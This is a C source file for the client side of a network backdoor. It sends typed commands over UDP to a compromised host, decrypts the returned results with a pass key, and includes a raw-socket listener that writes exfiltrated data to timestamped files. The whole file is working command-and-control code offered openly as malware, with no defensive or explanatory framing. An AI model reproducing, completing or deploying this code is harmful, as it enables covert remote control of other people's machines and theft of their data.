#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include "client.h"
#include "defs.h"
#include "util.h"
#include "ntp.h"
#include "inet.h"

int closing;

void backdoor_client(uint32 ipaddr, int dport, int duplex)
{
	int sock;
	struct sockaddr_in saddr;
	char command[MAX_LEN];
	pthread_t list_thread;
//	pthread_t exfil_thread;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	bzero(&saddr, sizeof(saddr));
	
	if (ipaddr == 0)
		error("Invalid IP specified.");

	if (!val_port(dport))
		error("Invalid destination port specified.");

	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = ipaddr;
	saddr.sin_port = htons(dport);

	if (duplex)
	{
		closing = 0;
		pthread_create(&list_thread, NULL, listen_thread, &saddr);
	}

	// exfil thread
//	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
	
	printf("Ready, awaiting your command...\n");
	while(fgets(command, MAX_LEN, stdin) != NULL)
	{
		char *frame;
		int length;

		length = strlen(command) + 1;

		frame = buildTransmission(command, &length, CMD_TYP);
		sendto(sock, frame, length, 0, (struct sockaddr *)&saddr, sizeof(saddr));
		free(frame);
	}	

	// Listen thread cleanup
	if (duplex)
	{
		closing = 1;
		pthread_join(list_thread, NULL);
	}

//	pthread_join(exfil_thread, NULL);
}

void *listen_thread(void *arg)
{
	struct sockaddr_in saddr = *(struct sockaddr_in*)arg;
	int sock;
	char buff[MAX_LEN];

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	printf("Listen thread active.\n");
	
	saddr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(sock, (struct sockaddr*)&saddr, sizeof(saddr)) < 0)
		error("Unable to bind result port.\n");

	while(!closing)
	{
		char *dec;
		int len;

		socklen_t size = sizeof(saddr);
		len = recvfrom(sock, buff, MAX_LEN, 0, (struct sockaddr*)&saddr, &size);

		dec = decrypt(PASSKEY, buff, len);
		memcpy(buff, dec, len);
		free(dec);

		buff[len] = 0x0;
		printf("%s", buff);
	}

	return NULL;
}

int val_port(int port)
{
	if (0 < port && port < 65535)
		return 1;
	else 
		return 0;
}

void* exfil_listen(void *arg)
{
	int sock;
	char buf[MAX_LEN];
	int ret;
	uint64 timestamp;
	char fname[MAX_LEN];
	FILE* file;
	uint32 src_addr = *(uint32*)arg;

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sock < 0)
	{
		perror("receive socket cannot be open. Are you root?");
		exit(1);
	}

	timestamp = get_sec();
	sprintf(fname, "%llX", timestamp);
	file = open_file(fname, TRUE);

	while (TRUE)
	{
		char *pbuf;
		ret = read(sock, &buf, MAX_LEN);
		pbuf = extract_udp(src_addr, buf, ret);
		printf("%s", pbuf);
		fwrite(pbuf, 2, 1, file);
		free(pbuf);
	}

	fclose(file);
	close(sock);

	return NULL;
}
